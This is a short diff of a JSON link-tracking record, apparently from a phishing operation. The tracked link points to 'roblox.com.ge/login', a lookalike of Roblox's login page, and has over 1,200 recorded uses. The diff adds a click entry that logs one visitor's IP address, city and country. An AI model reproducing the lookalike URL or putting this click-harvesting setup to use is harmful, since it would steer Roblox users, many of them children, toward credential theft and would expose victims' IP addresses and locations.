@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1232,
+    "useCount": 1233,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10000,6 +10000,14 @@
         "city": "Longview",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777330753543,
+        "ip": "58.69.177.230",
+        "country": "Philippines",
+        "city": "Manila",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
